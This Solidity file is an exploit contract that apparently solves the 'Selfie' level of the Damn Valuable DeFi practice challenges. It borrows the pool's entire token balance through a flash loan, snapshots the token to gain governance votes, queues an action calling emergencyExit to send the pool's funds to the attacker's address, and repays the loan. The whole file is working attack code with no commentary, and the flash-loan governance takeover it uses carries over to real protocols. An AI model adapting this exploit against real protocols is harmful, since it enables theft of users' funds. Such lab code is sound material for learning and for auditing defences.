// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./ISimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract selfiAttack is IERC3156FlashBorrower {
    SelfiePool pool;
    ISimpleGovernance gov;
    DamnValuableTokenSnapshot token;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint private actionId;
    address owner;

    constructor(address _pool, address _gov, address token_) {
        pool = SelfiePool(_pool);
        gov = ISimpleGovernance(_gov);
        token = DamnValuableTokenSnapshot(token_);
        owner = msg.sender;
    }

    function queueAttack() public {
        pool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            token.balanceOf(address(pool)),
            ""
        );
    }

    function executeAttack() public {
        gov.executeAction(actionId);
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );

        token.snapshot();
        actionId = gov.getActionCounter();
        gov.queueAction(address(pool), 0, data);
        token.approve(msg.sender, amount + fee);
        return CALLBACK_SUCCESS;
    }
}
